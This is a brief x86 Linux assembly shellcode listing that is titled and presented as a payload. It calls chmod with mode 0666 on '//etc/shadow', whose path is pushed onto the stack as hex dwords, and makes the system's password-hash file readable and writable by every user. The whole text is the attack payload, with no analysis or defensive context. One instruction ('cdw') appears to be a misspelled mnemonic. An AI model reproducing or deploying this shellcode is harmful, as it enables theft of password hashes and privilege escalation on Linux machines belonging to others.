
; Title:  linux/x86 chmod 666 /etc/ shadow 27 bytes
; Original Author: root@thegibson


section .text 
global _start

_start:
mov ax , 15 
cdw ; DX:AX <------- sign extend of AX 
push dx 
push dword 0x776f6461
push dword 0x68732f63 
push dword 0x74652f2f
mov ebx , esp 
mov cx , 0666o
int 0x80
